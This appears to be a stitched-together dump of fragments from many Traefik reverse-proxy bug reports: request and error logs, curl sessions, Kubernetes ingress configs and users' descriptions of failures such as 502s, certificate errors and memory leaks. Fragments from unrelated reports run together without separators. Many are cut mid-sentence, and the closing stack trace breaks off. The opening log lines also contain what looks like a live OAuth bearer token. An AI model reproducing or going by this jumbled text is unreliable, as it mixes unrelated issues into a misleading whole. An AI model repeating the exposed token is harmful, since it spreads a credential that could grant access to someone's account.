time="2020-10-25t10:22:00z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" forwardurl=" " request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/bdiservice/startsession\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\",\\"rawfragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"authorization\\":[\\"bearer ya29.a0afh6smdefg8-jlbbvhernrxw8nonswy0ey08s-fzdo4ee61i8k8uw-zn-kllnc0sedk5byih85jv76rbudwp27gxj5t7fs78odixhclqoryr6muh-kflveao6rpofszqe0ooslkembkfywgk3uteqw6bzk9ig23c0vtfyemhzvcl7pz17njrthkiry4vmwmggevvd2-x9bc4jkkdibnhwq9pt66huf8snuo\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"ir-agent-id\\":[\\"ir-qa-ofri\\"],\\"ir-version-name\\":[\\"2-0-5\\"],\\"server-version\\":[\\"2.0.0-3333\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-okhttp/1.29.0\\"],\\"x-forwarded-host\\":[\\"elliq-bdi-server-dev2.s.elliq.co:443\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-7ffffd687f-4b8tj\\"],\\"x-real-ip\\":[\\"10.128.0.3\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"xxx.yyy.co:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"10.128.0.3:1377\\",\\"requesturi\\":\\"/bdiservice/startsession\\",\\"tls\\":null}"
time="2020-10-25t10:22:00z" level=debug msg="\'502 bad gateway\' caused by: eof"
time="2020-10-25t10:22:00z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/bdiservice/startsession\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\",\\"rawfragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"authorization\\":[\\"bearer ya29.a0afh6smdefg8-jlbbvhernrxw8nonswy0ey08s-fzdo4ee61i8k8uw-zn-kllnc0sedk5byih85jv76rbudwp27gxj5t7fs78odixhclqoryr6muh-kflveao6rpofszqe0ooslkembkfywgk3uteqw6bzk9ig23c0vtfyemhzvcl7pz17njrthkiry4vmwmggevvd2-x9bc4jkkdibnhwq9pt66huf8snuo\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"ir-agent-id\\":[\\"ir-qa-ofri\\"],\\"ir-version-name\\":[\\"2-0-5\\"],\\"server-version\\":[\\"2.0.0-3333\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-okhttp/1.29.0\\"],\\"x-forwarded-host\\":[\\"xxx.yyy.co:443\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-7ffffd687f-4b8tj\\"],\\"x-real-ip\\":[\\"10.128.0.3\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"xxx.yyy.co:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"10.128.0.3:1377\\",\\"requesturi\\":\\"/bdiservice/startsession\\",\\"tls\\":null}"
certification request was failed, please see the debug log below for detail
it is working if i remove the dash from the host name.
curl just hang, access log show nothing
running in docker-compose on windows works fine, on linux docker-compose and swarm both works
(setting swarmmode=false when running compose of course)
we can see traefik adding ~ 1 second of latency after the java client issues an `expect: 100 continue`
the s3 sdk metrics reports this as increased "client upload time"
both of there requests uploaded the same file, the first through traefik and the second directly to a minio node (the latency is about 75% to the right)
2020-10-14 11:34:52,323 [main] debug com.amazonaws.latency - servicename=[amazon s3], statuscode=[200], serviceendpoint=[ requesttype=[putobjectrequest], awsrequestid=[163dd223794b22f8], httpclientpoolpendingcount=0, retrycapacityconsumed=0, httpclientpoolavailablecount=0, requestcount=1, httpclientpoolleasedcount=0, responseprocessingtime=[0.473], clientexecutetime=[1515.345], ****httpclientsendrequesttime=[1212.506],**** httprequesttime=[1449.983], apicalllatency=[1510.37], requestsigningtime=[32.831], credentialsrequesttime=[0.012, 0.002], httpclientreceiveresponsetime=[88.403],
2020-10-14 11:35:23,035 [main] debug com.amazonaws.latency - servicename=[amazon s3], statuscode=[200], serviceendpoint=[ requesttype=[putobjectrequest], awsrequestid=[163dd22aa1e88c71], httpclientpoolpendingcount=0, retrycapacityconsumed=0, httpclientpoolavailablecount=0, requestcount=1, httpclientpoolleasedcount=0, responseprocessingtime=[0.61], clientexecutetime=[447.607], ****httpclientsendrequesttime=[204.441]****, httprequesttime=[395.164], apicalllatency=[440.312], requestsigningtime=[30.409], credentialsrequesttime=[0.016, 0.003], httpclientreceiveresponsetime=[76.302],
we have done some triaging to harden the claim: - the instance of the service running on a server accessing the s3 via s3.example.com has minimum putobject latency of ~1 second
this is largely independent of size, this occurs on puts with a 1 byte payload as well as 200mb (except it is less noticable in that case)
- we could not configure the service to use minio01 directly due to a bug in the service, sadly
- a local instance of that service accessing s3.example.com directly has a putobject latency of ~1 second (slightly longer due to larger latency from the office to the lb) - a local instance of that service accessing minio01.example.com directly has a putobject latency closely mirroring the minio latency + network
we've enabled debug logging on a small dummy project running a put via the aws s3 sdk and this displays a 1 second delay after the `expect: 100 continue`, which only occurs with traefik in the loop
as another test, we've disabled the expect-continue-behavior and this removes the latency as well
``` 2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "user-agent: aws-sdk-java/1.11.837 linux/5.8.14-200.fc32.x86_64 openjdk_64-bit_server_vm/25.265-b01 java/1.8.0_265 vendor/red_hat,_inc[\ ][\ ]"
2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "x-amz-content-sha256: unsigned-payload[\ ][\ ]"
2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "x-amz-date: 20201014t095713z[\ ][\ ]"
2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "content-length: 1[\ ][\ ]"
2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "connection: keep-alive[\ ][\ ]"
>>>> 2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "expect: 100-continue[\ ][\ ]"
2020-10-14 11:57:13,681 [main] debug org.apache.http.wire - http-outgoing-0 >> "[\ ][\ ]"
>>>> 2020-10-14 11:57:14,869 [main] debug org.apache.http.wire - http-outgoing-0 << "http/1.1 100 continue[\ ][\ ]"
2020-10-14 11:57:14,870 [main] debug org.apache.http.wire - http-outgoing-0 << "[\ ][\ ]"
2020-10-14 11:57:14,873 [main] debug org.apache.http.headers - http-outgoing-0 << http/1.1 100 continue
2020-10-14 11:57:14,874 [main] debug org.apache.http.wire - http-outgoing-0 >> "1"
2020-10-14 11:57:14,998 [main] debug org.apache.http.wire - http-outgoing-0 << "http/1.1 200 ok[\ ][\ ]"
2020-10-14 11:57:14,998 [main] debug org.apache.http.wire - http-outgoing-0 << "accept-ranges: bytes[\ ][\ ]"
2020-10-14 11:57:14,998 [main] debug org.apache.http.wire - http-outgoing-0 << "content-length: 0[\ ][\ ]"
error stack
the certificate resolver will silent fail (on debug logging)
each router using that certresolver will fail with `the router uses a non-existent resolver`.
short answer:
no access: the tcp listener crashed and never recovered
thus traefik is not useable
long answer:
traefik is starting ok and binds ok:
> netstat -nap tcp |grep listen | grep ".80"
tcp 0 0 *.80 *.* listen
first curl timeouts (the listener probably crashed and never closed the connection):
> curl -vlh 'host: my.domain'
* trying 127.0.0.1:80...
* connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> get / http/1.1
> host: 127.0.0.1
> user-agent: curl/7.69.1
> accept: */*
and other curls can't even access anymore:
> curl -vlh 'host: my.domain'
* trying 127.0.0.1:80...
* connect to 127.0.0.1 port 80 failed: connection refused
* failed to connect to 127.0.0.1 port 80: connection refused
* closing connection 0
curl: (7) failed to connect to 127.0.0.1 port 80: connection refused
indeed, the listener failed (see logs below):
> netstat -nap tcp |grep listen | grep ".80"
you can see the culprit in the logs:
time="2020-10-10t13:47:58z" level=error msg="set tcp 127.0.0.1:80->127.0.0.1:34520: protocol not available" entrypointname=web
time="2020-10-10t13:47:58z" level=error msg="error while starting server: set tcp 127.0.0.1:80->127.0.0.1:34520: protocol not available" entrypointname=web
time="2020-10-10t13:47:58z" level=error msg="error while starting server: set tcp 127.0.0.1:80->127.0.0.1:34520: protocol not available" entrypointname=web
the problem is: openbsd has no user-settable per-socket tcp keepalive in traefik, the setkeepaliveperiod function is called for new tcp connections and an error is returned if necessary: #l342 in go sources, we can see that openbsd always returns an error (enoprotoopt):
=> pr in progress other projects had the bug too:
traefik pods memory is increasing gradually and eventually being killed by oom killer
421 misdirected request as traefik falls back to default tls options when removing the rule with the pathprefix it works as expected
traefik being killed because it consumes too much memory.
extensions/v1beta1 api group because of the status managed field
neither of my above expectations were fulfilled.
blank screen on firefox, (on web debug console we can see that one js script has syntax error)
401 http error on chrome
dashboardui on brave ### output of `traefik version`: traefik docker image ex: docker run traefik version traefik:v2.3
by default, `ingressroute` will allow users to cross-namespace boundaries even though the user would expect this behavior to be disallowed given current constraints on `ingress`
error log: `time="2020-09-23t23:43:43z" level=error msg="field not found, node: serverstransports" container=server-docker-services-20fab893aebaacb410a1cb61048f881e109260af60c00eb7b1c2fc2cbb74dceb providername=docker` the v2.3.0 branch also seems to be missing the commits to implement serverstransports (while they are on master).
`delaybeforecheck` delays the check
`disablepropagationcheck` skips the check
gateway timeout
reverting to kubernetes 1.18 resolves the issue.
only the custom 401 error page is displayed instantly, **without** asking for a password
**note:** when using "basic-auth" middleware before "error-pages", it will show the browser-prompt but only display the **default** 401 page (after clicking abort).
a canceled request.
some element of the pages behind traefik does not show
error in the log that were not present in 2.2.8
time="2020-09-03t20:29:54z" level=info msg="configuration loaded from file: /etc/traefik/traefik.yml"
2020/09/03 20:29:55 traefik.go:76: command traefik error: failed to download plugin github.com/containous/plugin-simplecache: error: 400: {"error":"invalid token"}
exception above
the request failed as 'this site can provide a secure connection'
**surprisingly, it works if i disable snistrict**, the tlsstore cert is used and works as expected.
**also, it works if one of the ingressroute has secretname (with snistrict enabled)**
given that all other ingressroutes also entertains same host.
as a work around, i have added a dummy ingressroute which uses tls-cert from secret
this makes it work for all the ingressroute in different namespaces too (given that only the dummy ingressroute has tls secretname mentioned)
dummy ingressroute ```
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: dummy-ingress namespace: ingress
spec: entrypoints: - websecure tls: secretname: tls-cert
``` other ingress route
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: service1-ingress namespace: service1-ns
spec: entrypoints: - websecure tls: {}
i always get a 404 error, unless i add the service tag:
`traefik.http.services.my-service.loadbalancer.server.scheme=http` since my traefik logs show the backend address as " " i would expect it would by default use http to try to access this backend but it doesn\'t unless i add the tag above
### output of `traefik version`:
version: 2.3.0-rc4
codename: picodon
go version: go1.15
built: 2020-08-19t16:02:03z
os/arch: linux/amd64
```e=consulcatalog
memory leak
the following log appears in traefik ```
reverseproxy.go:445: httputil: reverseproxy read error during body copy: read tcp 10.0.0.1:55818->10.0.0.2:80: use of closed network connection
``` i captured all the traffic with tcpdump
9194 2020-08-04 11:28:10.486443 10.0.0.1 10.0.0.2 tcp 66 59958 80 [rst, ack] seq=28414 ack=76298 win=178304 len=0 tsval=0 tsecr=279582616
i found this issue
[github pages](
is this caused by go? how can i fix it.
traefik throws starts then throws several error messages: ```
time="2020-08-06t22:02:23z" level=error msg="accept tcp [::]:8080: use of closed network connection" entrypointname=web
-- | time="2020-08-06t22:02:23z" level=error msg="accept tcp [::]:8081: use of closed network connection" entrypointname=traefik | time="2020-08-06t22:02:23z" level=error msg="close tcp [::]:8080: use of closed network connection" entrypointname=web | time="2020-08-06t22:02:23z" level=error msg="close tcp [::]:8081: use of closed network connection" entrypointname=traefik
``` note: traefik works without issue if `exposedbydefault` is set to true;
<html><head><title>request rejected</title></head><body>the requested url was rejected
please consult with your administrator.<br><br>your support id is: 14944147168071255888<br><br><a href='javascript:history.back();'>[go back]</a></body></html>
proxy_app.0.y75ghkvn81b7@m10 | time="2020-08-05t13:53:06z" level=debug msg="error while peeking first byte: read tcp 192.168.224.3:110->10.1.1.1:52524: read: connection reset by peer"
instead i see `error: protocol error, got "h" as reply type byte` as the response
looking into it a bit more: i used #4930 and ran: `for i in `seq 1 10`; do echo 'ping' | nc some.domain.tld 6379; done | uniq -c` and found the response of ``` 1 400 bad requesthttp/1.1 400 bad request 1 content-type: text/plain; charset=utf-8 1 connection: close
which shouldn't happen since i'm using tcp
i see a "part time" working connection
the first requests works fine but after some request i get a 404 in the browser.
curl is working fine
it's the same issue like the only difference is that i'm using the tcp router.
on #http-to-https-redirection-is-now-configured-on-routers , several objects in the k8s ingressroute configs have names that include underscores (_)
this goes against [k8s naming convention]( in which names for most resource types must follow [rfc 1123](
sample output (truncated): ```
% kubectl apply -f test.yaml error from server (invalid): error when creating "test.yaml": ingressroute.traefik.containo.us "http_catchall" is invalid: metadata.name: invalid value: "http_catchall": a dns-1123 subdomain must consist of lower case alphanumeric characters, \'-\' or \'.\', and must start and end with an alphanumeric character (e.g
'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')
``` ### notes - one fix might be to change from an underscore (_) to a hyphen (-)
- presumably, the names in the k8s examples should match the ones in the docker examples and the toml and yaml static config files
- this issue appears to exist in docs versions 2.1 and later
- the same issue may affect other docs
traefik rate limit my local machine even if the limit is not reached.
time="2020-07-25t08:35:22z" level=error msg="provider connection error ec2metadatarequesterror: failed to get ec2 instance identity document\ caused by: requesterror: send request failed\ caused by: get \\" ": dial tcp 169.254.169.254:80: connect: invalid argument, retrying in 280.071208ms" providername=ecs
download plugin on instance
after approximately 5 seconds the dashboard refreshes to display missing data and broken images, with a corresponding `http2: stream closed` error in the logs:
![annotation 2020-07-20 142920]( note this doesn't happen with the services or middleware pages
it also doesn\'t happen if you use the "success/warning/error" tabs, only on the default "all status" tab.
config stopped working after updated to 2.2.6 from 2.2.2
the ports 80 and 443 remained working.
1 health for each router: ![log](
traefik 2.1.4: the content-length header removed, but includes the `transfer-encoding: chunked` header
traefik 2.2.4: the content-length header and `transfer-encoding: chunked` header were both removed the challenge for this scenario is the http 1.1 spec doesn't appear to have an explicit exception for both headers in head responses, although that sounds like a reasonable exception since there is actually no body content transmitted
there are also some reports that browsers accept both headers as a hint for progress bars, etc
from what i was able to determine, it looks like a change would necessary to oxy,
i think a reasonable option for traefik would be configurable options to include the content-length header in head responses with chunked responses, or something along those lines
i cannot modify the clients to accept a different header name
although, after testing under 2.2.4, i'm not sure why both headers were removed
fyi, i was able to manually build a recent snapshot of reactor-netty which which no longer sends the transfer-encoding: chunked header when a content-length is present in head requests, and the behavior on 2.2.4 seems things seem to be okay
i am not sure if dropping both of the headers is the appropriate action for 2.2.4
i got a 404 error on
sometimes traefik returns a 404
e.g., request
request url:
request method: get
status code: 404 remote address: xxx.xxx.xxx.xxx:443
referrer policy: no-referrer-when-downgrade
``` response
content-length: 19
content-type: text/plain; charset=utf-8
date: fri, 10 jul 2020 13:57:38 gmt
status: 404
x-content-type-options: nosniff
page not found
- the correct certificate is used for ` ` and ` `.
- the `cn=example.com` certificate is wrongly used for ` ` and ` ` instead of the correct one.
udp connections are successful, but ts is reporting packet loss between 5% and 20% , mumble you connect but there is no voice traffic
doesn't seem to make a difference if you are hitting traefik on the same node or a different one to the one running the pod.
the log shows repeated inwx: 2002 errors.
time="2020-07-02t11:26:54z" level=error msg="unable to obtain acme certificate for domains \\"maubot.xxx.de\\": unable to generate a certificate for the domains [maubot.xxx.de]: error: one or more domains had a problem:
[maubot.xxx.de] [maubot.xxx.de] acme: error presenting token: inwx: (2002) command use error
" providername=letsencrypt.acme rule="host(`maubot.xxx.de`)" routername=maubot@docker time="2020-07-02t11:26:54z" level=error msg="unable to obtain acme certificate for domains \\"xxx.de\\": unable to generate a certificate for the domains [xxx.de]: error: one or more domains had a problem:
[xxx.de] [xxx.de] acme: error presenting token: inwx: (2002) command use error
" providername=letsencrypt.acme rule="host(`xxx.de`) && (pathprefix(`/dashboard`) || pathprefix(`/api`))" routername=api@docker time="2020-07-02t11:27:35z" level=error msg="unable to obtain acme certificate for domains \\"www.xxx.de,xxx.de\\": unable to generate a certificate for the domains [www.xxx.de xxx.de]: error: one or more domains had a problem:
[xxx.de] [xxx.de] acme: error presenting token: inwx: (2002) command use error
" providername=letsencrypt.acme routername=nginx@docker rule="host(`www.xxx.de`) || host(`xxx.de`)"
``` the inwx api documentation does not really help here ( but i contacted the inwx support and they said they notice these errors in their logs whenever my client tries to send a command while it is not logged in! so my theory is, that traefik maybe tries to resolve those certificates in parallel and some instances log in and work correctly and log out again, while others still try to send commands and fail, needing to retry
or it is a bug in lego and it tries to send commands after the logout
if there is anything i can help with debugging, please let me know
for members of the traefik project i would be even willing to setup a temporary inwx account if this helps debugging
i do not know if it is related to
if you point me to what i need to change in my config, i can test wildcard certificate.
received request by the backend server ```
# http http/1.1 200 ok
content-length: 298
content-type: text/plain
date: tue, 30 jun 2020 05:23:57 gmt
server: openresty/1.11.2.5 get /api http/1.1
host: api.localhost.local
user-agent: httpie/0.9.8
accept: */*
accept-encoding: gzip, deflate
x-forwarded-for: 172.106.0.1
x-forwarded-host: api.localhost.local
x-forwarded-port: 443
x-forwarded-proto: https
x-forwarded-server: afdadc467921
x-real-ip: 172.106.0.1 ```
performance is ok on both machines (did not benchmark)
however, when taking a look at the logs, the amd (ryzen) based server is flooded with this: ```
time="2020-06-23t14:05:02z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:05:51z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:06:40z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:09:40z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:16:19z" level=error msg="error while hello: eof"
time="2020-06-23t14:19:10z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:22:23z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:28:47z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:34:37z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:35:06z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:35:29z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:36:39z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:44:37z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t14:53:38z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:10:52z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:24:45z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:28:02z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:40:19z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:41:05z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:42:27z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:44:46z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:45:19z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:49:20z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:50:26z" level=error msg="error while hello: bufio: buffer full"
time="2020-06-23t15:53:48z" level=error msg="error while hello: bufio: buffer full"
text is just 1 line and full regex doesn't appear
accesslog field originstatus is 502
error during stack deploy: ```
services.reverse-proxy.deploy.labels.traefik.enable must be a string, number or null
response without cors headers
i found the name of the annotation to be incorrect
the doc page says the annotation is named "traefik.ingress.kubernetes.io/service.sticky" and "traefik.ingress.kubernetes.io/service.sticky: "true"" this does not work
what does work is "traefik.ingress.kubernetes.io/service.sticky.cookie": "true"
no error, no help with finding the configuration issue.
persistent http connections from traefik to the backend servers for services are closed when health checks for the service are executed.
instead i sometimes (25-75% of the times) see two almost simultaneously initiated orders with the acme server when traefik starts, and when this happens, a acme server interaction failure can follow about 50% of the times
### my analysis
i can spot when one or two acme orders are placed by traefik's use of the lego library against the acme server by seeing either one or two lines of the following in the logs: __`acme: obtaining bundled san certificate`__
the logged line above comes from [here in go-acme/lego]( #l89-l97)
when that happens, traefik probably have invoked it twice, and __i suspect [this section]( #l320-l423) is ending up calling the [resolvecertifciate]( #l425) function twice__, which in turn calls the go-acme/lego library's obtain function twice.
i see no update in `traefik_entrypoint_open_connections` and `traefik_service_open_connections` metrics as queries never end.
the routers and services were not there.
my pods were outputting an error in my middleware, something along the lines of parsebool failed - expected t or f but found " (double quote).
the logs suggest that it does not have knowledge of authelia
time="2020-05-25t13:01:30z" level=error msg="middleware \\"authelia@docker\\" does not exist" entrypointname=websecure routername=proxmox-router@file
time="2020-05-25t13:01:31z" level=error msg="middleware \\"authelia@docker\\" does not exist" entrypointname=websecure routername=proxmox-router@file
time="2020-05-25t13:01:31z" level=error msg="middleware \\"authelia@docker\\" does not exist" routername=proxmox-router@file entrypointname=websecure
``` from the logs of the startup sequence, it's clear that the file provider starts before the docker provider, which i suspect is why this happening; it's parsing the file, and cannot find `authelia@docker` because the docker provider hasn't finished initialising yet
to be clear, i haven't tracked it down through the source, so this is only my guess
if this is the case though, it would be good for the file provider to be able to recognise the `@docker` suffix and treat it differently
i'm not sure on what the best way of handling it is however, without making it somewhat messy with the file provider having knowledge of the docker provider etc.
the header name must match the casing of the received header to be included in the filter set.
nothing happened.
* `internal server error` in browser ### output of `traefik version`: version:2 ```
# traefik pod log
level=error msg="subset not found for kube-system/kubernetes-dashboard" providername=kubernetescrd ingress=kubernetes-dashboard namespace=kube-system` in the traefik pod log
i see a number of new orders that are stacking up and making me rate limited by let's encrypt
### output of `traefik version`: ```
$ curl -v -h "accept-encoding: deflate,gzip" -h "accept: plain/text" localhost/whoami/data?size=5000
> get /whoami/data?size=5000 http/1.1
> host: localhost
> user-agent: curl/7.64.0
> accept-encoding: deflate,gzip
> accept: plain/text
> < http/1.1 200 ok
< content-encoding: gzip
< content-type: text/plain; charset=utf-8
< date: thu, 14 may 2020 18:39:00 gmt
< vary: accept-encoding
< content-length: 80
tcpdump shows that traefik accepts packet on one ip but responds to client from other
when i specify ip address in entrypoints traefik responds with correct (specified) ip.
- duplicated datagrams
- when receiving multiple packets in short succession, it looks like traefik may overwrite the data of earlier packets with the data of the current one
- another application showed similar behaviour: sending a 15 byte and a 5 byte udp packet with the following data to traefik ..
26:10:62:c8:55:44:12:9f:00:00:02:03:03:09:00 2c:00:00:00:00 ..
leads to traefik sending the following 15 byte and 5 byte data packets to the backend: 2c:00:00:00:00:44:12:9f:00:00:02:03:03:09:00 2c:00:00:00:00 - it looks like the first five bytes of the buffer for the 15 byte packet were overwritten with the data of the previous packet - i believe that already appended messages in c.msgs may be overwritten with the next readfrom(buf) in case read() has not collected them yet
see also minimal example at and pr #6797.
the server application indicated many connections remained open
the following repeats until the heat death of the universe (or until my power goes out):
helloreply(akka-grpc-77-4,unknownfieldset(map()))
helloreply(akka-grpc-40-4,unknownfieldset(map()))
helloreply(akka-grpc-53-4,unknownfieldset(map()))
helloreply(akka-grpc-48-4,unknownfieldset(map()))
helloreply(akka-grpc-97-9,unknownfieldset(map()))
helloreply(akka-grpc-61-9,unknownfieldset(map()))
helloreply(akka-grpc-91-9,unknownfieldset(map()))
helloreply(akka-grpc-71-9,unknownfieldset(map()))
the 301 redirect has no extra headers
the traefik web interface shows everything working as it should
headers are sent on urls that do not trigger the regexredirect.
this rule would not show up in the ui
if there is an error, it should show up in the dashboard
disappearing from the dashboard made me confused and hard to track what is going on.
it doesn't take effect
the logs of traefik has the following line:
time="2020-05-06t15:12:41z" level=error msg="invalid syntax for match rule: host(`dummy.host`) && headersregexp(`x-real-ip`, `172\\\\..*`)" ingress=bug namespace=traefik providername=kubernetescrd
``` by the way, i also tried with double backslash ``headersregexp(`x-real-ip`, `172\\\\..*`)``
it is recognized as a correct rule, but it cannot match an ip of `172.18.3.0`.
constantly increasing memory usage
<img width="1602" alt="screenshot 2020-05-02 at 14 54 42" src=" "> if necessary i can post more screenshots from prometheus.
errors in the logs suggesting that the port must be a quoted string, not a number
only on the swarm node 3 i obtain : ```
time="2020-04-28t20:17:07z" level=debug msg="configuration received from provider docker: {}"
time="2020-04-28t20:17:07z" level=info msg="skipping same configuration for provider docker"
time="2020-04-28t20:17:11z" level=debug msg="looking for an existing acme challenge for ..."
time="2020-04-28t20:17:11z" level=debug msg="looking for provided certificate to validate ..."
time="2020-04-28t20:17:11z" level=debug msg="no provided certificate found for domains ...., get acme certificate."
time="2020-04-28t20:17:11z" level=debug msg="acme got domain cert .......it"
time="2020-04-28t20:17:11z" level=debug msg="http: tls handshake error from 192.168.0.133:57672: remote error: tls: bad certificate"
![image]( i only see the value of the header.
http/1.1 200 ok
access-control-allow-credentials: true
cache-control: no-cache, max-age=0
content-length: 2
content-type: text/plain; charset=utf-8
date: sun, 26 apr 2020 06:56:15 gmt
referrer-policy: no-referrer
strict-transport-security: max-age=15552000
vary: accept-encoding
vary: origin
x-content-type-options: nosniff
x-frame-options: deny
x-xss-protection: 1; mode=block
$ curl
> 172.26.0.1 - - [20/apr/2020:14:14:49 +0000] "get /no-exists http/1.1" 401 17 "-" "-" 1 "whoami@docker" "-" 0ms
``` ### output of `traefik version`: tested with traefik 1.7 and traefik 2.2: same behavior observed
configuration used for tests is available at #issuecomment-616583684
the `sourcecriterion.requestheadername` is ignored, and the defined header has no effect
even though the middleware appears with the appropriate configuration on the traefik dashboard, the logs confirm it is using the default sourcecriterion (`ipstrategy`) instead.
could not access unless explicitly setting ```
[api] insecure = true
an empty page in firefox with those errors: ```
the script from was loaded even though its mime type ( ext/plain ) is not a valid javascript mime type
the script from was loaded even though its mime type ( ext/plain ) is not a valid javascript mime type
the stylesheet was not loaded because its mime type, ext/plain , is not ext/css
the script from was loaded even though its mime type ( ext/plain ) is not a valid javascript mime type
the script from was loaded even though its mime type ( ext/plain ) is not a valid javascript mime type
the stylesheet was not loaded because its mime type, ext/plain , is not ext/css
``` and a totally broken page in chrome which was unthemed and threw those errors: ```
resource interpreted as stylesheet but transferred with mime type text/plain: "<url>".
traefik.domain.com/:1 resource interpreted as stylesheet but transferred with mime type text/plain: " ".
app.3d96daf8.js:1 resource interpreted as stylesheet but transferred with mime type text/plain: " ".
app.3d96daf8.js:1 resource interpreted as stylesheet but transferred with mime type text/plain: " ".
app.3d96daf8.js:1 resource interpreted as stylesheet but transferred with mime type text/plain: " ".
app.3d96daf8.js:1 resource interpreted as stylesheet but transferred with mime type text/plain: " ".
some ready pods were not treated by traefik, and thus, was not routed traffic to
meanwhile observed `skipping same configuration for provider` messages.
the number of routers doesn't change
only the entries of the table are updated automatically to show the new router
this applies to services and middlewares too
i only tested this with http but it probably applies to the tcp and udp pages as well.
windows authentication fails
this headline which is not uppercased properly on my system using chrome 80 on windows
this only happens on when the font size is set to < 12px
on 13px it looks normal
![image](
logging - executing "\\\\" at <$backend.stickiness.secure>: can\'t evaluate field stickiness in type *types.backend" problem
- rules hadn't been load
### output of `traefik version`: 1.7.23 ```
version: v1.7.23
codename: maroilles
go version: go1.14.1
built: 2020-03-23_04:04:41pm
os/arch: linux/amd64
instead you'll see the spoofed ip (i.e
`1.2.3.4`) in the `clienthost` field
please note that the downstream backend receives the expected headers, and the bug only applies to access logs.
tls 1.2 only enabled
handling connection for 8443
handling connection for 8443
error: error upgrading connection: unable to upgrade connection: internal server error
traefik is periodically killed by the linux kernel due to an oom (when hitting the 128 mb memory limit)
the issue can be reproduced more quickly by firing plenty of requests against the instance, e.g., using `ab`: ```
ab -n 100000 -c 10
failure and a `404` on the endpoint.
without any path "" or maybe "/", the route "get " would fail to redirect to " "
it would just stop with a 404.
`host` field of `http.request` is not set correctly:
{ "method": "get", "url": { "scheme": "", "opaque": "", "user": null, "host": "", "path": "/status", "rawpath": "", "forcequery": false, "rawquery": "format=json", "fragment": "" }, "proto": "http/1.1", "protomajor": 1, "protominor": 1, "header": { "accept": [ "*/*" ], "host": [ "example.com" ], "user-agent": [ "curl/7.58.0" ], "x-forwarded-host": [ "127.0.0.1:8080" ], "x-forwarded-port": [ "8080" ], "x-forwarded-proto": [ "http" ], "x-forwarded-server": [ "lb.example.com" ], "x-real-ip": [ "127.0.0.1" ] }, "contentlength": 0, "transferencoding": null, "host": "127.0.0.1:8080", "form": null, "postform": null, "multipartform": null, "trailer": null, "remoteaddr": "127.0.0.1:13094", "requesturi": "/status?format=json", "tls": null
``` ### output of `traefik version`:
$ docker run -ti traefik:v2.2.0-rc2 version
version: 2.2.0-rc2
codename: chevrotin
go version: go1.14
built: 2020-03-11t17:42:16z
os/arch: linux/amd64
panic: runtime error: racy use of timers goroutine 605 [running]:
time.resettimer( , ) /usr/local/go/src/runtime/time.go:233 +
